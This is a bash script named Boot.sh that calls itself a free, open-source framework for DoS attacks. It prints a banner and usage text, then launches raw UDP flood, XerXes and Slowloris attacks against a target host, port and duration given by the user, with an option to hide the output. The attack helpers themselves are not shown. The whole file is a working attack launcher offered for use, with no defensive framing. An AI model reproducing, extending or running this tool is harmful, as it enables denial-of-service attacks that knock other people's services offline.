#!/bin/bash

#Colors

# Reset
Color_Off='\033[0m'       # Text Reset
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
# Bold
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BBlue='\033[1;34m'        # Blue
# High Intensity
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IBlue='\033[0;94m'        # Blue
# Bold High Intensity
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIBlue='\033[1;94m'       # Blue

echo -e "${IRed}
 ▄▄▄▄    ▒█████   ▒█████  ▄▄▄█████▓       ██████  ██░ ██ 
▓█████▄ ▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒     ▒██    ▒ ▓██░ ██▒
▒██▒ ▄██▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░     ░ ▓██▄   ▒██▀▀██░
▒██░█▀  ▒██   ██░▒██   ██░░ ▓██▓ ░        ▒   ██▒░▓█ ░██ 
░▓█  ▀█▓░ ████▓▒░░ ████▓▒░  ▒██▒ ░  ██▓ ▒██████▒▒░▓█▒░██▓
░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░    ▒▓▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░     ░     ░▒  ░ ░▒  ░ ░ ▒ ░▒░ ░
 ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░       ░   ░  ░  ░   ░  ░░ ░
 ░          ░ ░      ░ ░             ░        ░   ░  ░  ░
      ░                              ░                   
${Color_Off}"
echo ""
echo -e "${IGreen}Welcome to Boot.sh; This is a simple, free, open-source Framework for DoS Attacks."
echo ""
echo -e "Usage Raw UDP: ${Red}./boot.sh rawudp [ip] [port] [time] [size] [invisible (1/0)]${IGreen}"
echo -e "Usage XerXes: ${Red}./boot.sh xerxes [hostname] [port] [time] [invisible (1/0)]${IGreen}"
echo -e "Usage Slowloris: ${Red}./boot.sh slowloris [hostname] [port] [time] [https or http] [invisible (1/0)]${Color_Off}"
echo ""
if [ -z $1 ]
	then
		exit
fi
if [ $1 == 'rawudp' ]
	then
		if [ -z $2 ]
			then
				echo "set target, port, time and size"
				exit
		fi
		if [ -z $3 ]
			then
				echo "set port, time and size"
				exit
		fi
		if [ -z $4 ]
			then
				echo "set time and size"
				exit
		fi
		if [ -z $5 ]
			then
				echo "set size"
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		if [ -z $6 ]
			then
				perl inc/u $2 $3 $5 $4
		elif [ $6 -eq 0 ]
			then	
				perl inc/u $2 $3 $5 $4
		elif [ $6 -eq 1 ]
			then
				perl inc/u $2 $3 $5 $4 > /dev/null 2>&1
		else
			exit
		fi
fi
if [ $1 == 'xerxes' ]
	then
		if [ -z $2 ]
			then
				echo "set target, port and time"
				exit
		fi
		if [ -z $3 ]
			then
				echo "set port and time"
				exit
		fi
		if [ -z $4 ]
			then
				echo "set time"
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		if [ -z $5 ]
			then
				timeout $4 inc/x $2 $3
		elif [ $5 -eq 0 ]
			then	
				timeout $4 inc/x $2 $3
		elif [ $5 -eq 1 ]
			then
				timeout $4 inc/x $2 $3 > /dev/null 2>&1
		else
			exit
		fi
fi
if [ $1 == 'slowloris' ]
	then
		if [ -z $2 ]
			then
				echo "set target, port, time and method [http/https]"
				exit
		fi
		if [ -z $3 ]
			then
				echo "set port, time and method [http/https]"
				exit
		fi
		if [ -z $4 ]
			then
				echo "set time and method [http/https"
				exit
		fi
		if [ -z $5 ]
			then
				echo "set method [http/https]"
				exit
		fi
		echo ""
		echo -e "${BIRed}HIT CTRL+C TO EXIT.${Cyan}"
		if [ $5 == 'https' ]
			then
				if [ -z $6 ]
					then	
						timeout $4 perl inc/s -dns $2 -port $3 -https
				elif [ $6 -eq 0 ]
					then
						timeout $4 perl inc/s -dns $2 -port $3 -https
				elif [ $6 -eq 1 ]
					then
						timeout $4 perl inc/s -dns $2 -port $3 -https > /dev/null 2>&1
				else
					exit
				fi
		else
			if [ -z $6 ]
				then	
					timeout $4 perl inc/s -dns $2 -port $3
			elif [ $6 -eq 0 ]
				then
					timeout $4 perl inc/s -dns $2 -port $3
			elif [ $6 -eq 1 ]
				then
					timeout $4 perl inc/s -dns $2 -port $3 > /dev/null 2>&1
			else
				echo "please put 0 or 1 (0=no, 1=yes), defaulting to 0"
				exit
			fi
		fi
fi
exit
